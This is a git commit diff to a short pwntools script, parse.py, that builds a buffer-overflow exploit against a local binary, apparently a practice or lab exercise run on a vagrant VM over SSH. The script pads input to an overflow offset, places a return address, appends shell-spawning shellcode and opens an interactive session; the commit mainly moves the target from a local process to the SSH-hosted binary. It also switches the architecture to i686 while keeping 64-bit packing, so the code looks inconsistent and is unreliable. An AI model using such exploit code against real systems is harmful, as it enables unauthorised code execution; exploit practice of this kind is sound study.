8a31a9b56a5e652ee25dfb7e981b20fc89dca861
kod <kod@a>
2020-08-07 10:22:42 -0700

    idk

--- parse.py
+++ parse.py
@@ -1,6 +1,13 @@
 from pwn import *
+import base64
 
-context.update(arch='amd64', os='linux')
+context.update(arch='i686', os='linux')
+
+# Connect to the server with SSH
+ssh_connection = ssh('vagrant', 'default', port=2222)
+
+# Open a shell to write more stuff to
+bash = ssh_connection.run('bash')
 
 shellcode = shellcraft.sh()
 print(shellcode)
@@ -10,7 +17,7 @@ payload  = cyclic(cyclic_find(0x0000555555555751))
 payload += p64(0xdeadbeef)
 payload += asm(shellcode)
 
-p = process("./parse")
-p.sendline(payload)
-p.interactive()
+bash.sendline('/vagrant/parse')
+bash.sendline(payload)
+bash.interactive()
 
